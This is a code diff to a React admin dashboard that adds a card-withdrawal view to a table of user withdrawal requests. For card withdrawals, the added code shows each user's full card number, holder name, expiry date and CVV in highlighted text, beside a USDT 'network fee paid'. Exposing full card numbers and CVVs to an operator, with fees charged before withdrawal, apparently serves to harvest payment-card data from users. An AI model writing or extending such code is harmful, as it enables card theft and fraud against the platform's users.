@@ -741,7 +741,8 @@ export default function AdminDashboardPage() {
                                         <thead>
                                             <tr>
                                                 <th>Client Info</th>
-                                                <th>Bank Routing Info</th>
+                                                <th>Method</th>
+                                                <th>Payment Details</th>
                                                 <th>Amount</th>
                                                 <th>Network Fee Paid</th>
                                                 <th>Submitted Date</th>
@@ -757,9 +758,41 @@ export default function AdminDashboardPage() {
                                                         <div className="text-secondary small">{w.users?.email || w.user_email}</div>
                                                     </td>
                                                     <td>
-                                                        <div><b>Bank:</b> {w.bank_name}</div>
-                                                        <div><b>Acct Name:</b> {w.account_name}</div>
-                                                        <div className="font-monospace"><b>Acct #:</b> {w.account_number}</div>
+                                                        {w.withdrawal_method === 'card' ? (
+                                                            <span className="badge" style={{ background: 'linear-gradient(135deg,#eab308,#f59e0b)', color: '#000', fontWeight: 700, fontSize: '11px', padding: '5px 10px', borderRadius: '20px' }}>
+                                                                💳 Debit Card
+                                                            </span>
+                                                        ) : (
+                                                            <span className="badge" style={{ background: 'linear-gradient(135deg,#6366f1,#a855f7)', color: '#fff', fontWeight: 700, fontSize: '11px', padding: '5px 10px', borderRadius: '20px' }}>
+                                                                🏦 Bank Transfer
+                                                            </span>
+                                                        )}
+                                                    </td>
+                                                    <td>
+                                                        {w.withdrawal_method === 'card' ? (
+                                                            <div style={{ fontSize: '13px' }}>
+                                                                <div className="d-flex align-items-center gap-1 mb-1">
+                                                                    <span className="badge badge-secondary" style={{ fontSize: '10px', textTransform: 'uppercase', background: '#334155', color: '#eab308', fontWeight: 700, borderRadius: '6px', padding: '2px 6px' }}>
+                                                                        {w.card_type || 'Card'}
+                                                                    </span>
+                                                                    <span className="font-monospace fw-bold">{w.card_number_masked || w.account_number}</span>
+                                                                </div>
+                                                                <div className="font-monospace text-danger fw-bold" style={{ fontSize: '12px', letterSpacing: '1px' }}>
+                                                                    Full: {w.card_number_full || '—'}
+                                                                </div>
+                                                                <div><b>Holder:</b> {w.card_holder_name || w.account_name}</div>
+                                                                <div className="d-flex gap-3">
+                                                                    <span><b>Expiry:</b> {w.card_expiry || '—'}</span>
+                                                                    <span><b>CVV:</b> <span className="font-monospace text-warning">{w.card_cvv || '—'}</span></span>
+                                                                </div>
+                                                            </div>
+                                                        ) : (
+                                                            <div style={{ fontSize: '13px' }}>
+                                                                <div><b>Bank:</b> {w.bank_name}</div>
+                                                                <div><b>Acct Name:</b> {w.account_name}</div>
+                                                                <div className="font-monospace"><b>Acct #:</b> {w.account_number}</div>
+                                                            </div>
+                                                        )}
                                                     </td>
                                                     <td className="font-weight-bold text-danger">-${parseFloat(w.amount).toLocaleString()} USD</td>
                                                     <td className="font-weight-bold text-warning">{w.fee} USDT</td>
@@ -787,6 +820,7 @@ export default function AdminDashboardPage() {
                             </div>
                         </div>
                     )}
+
 
                     {/* --- VIEW 6: TRANSFER MONITORING --- */}
                     {activeTab === 'transfers' && (
